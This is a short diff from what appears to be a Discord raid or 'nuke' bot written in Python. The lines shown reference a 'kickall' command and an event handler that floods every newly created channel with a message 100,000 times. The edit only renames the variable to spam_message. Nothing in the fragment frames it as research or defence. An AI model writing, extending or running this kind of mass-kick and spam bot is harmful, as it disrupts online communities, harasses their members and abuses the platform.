@@ -201,5 +201,5 @@ async def kickall(ctx):
 @bot.event
 async def on_guild_channel_create(channel):
     for x in range(100000):
-        await channel.send(message)
+        await channel.send(spam_message)
 bot.run(token)
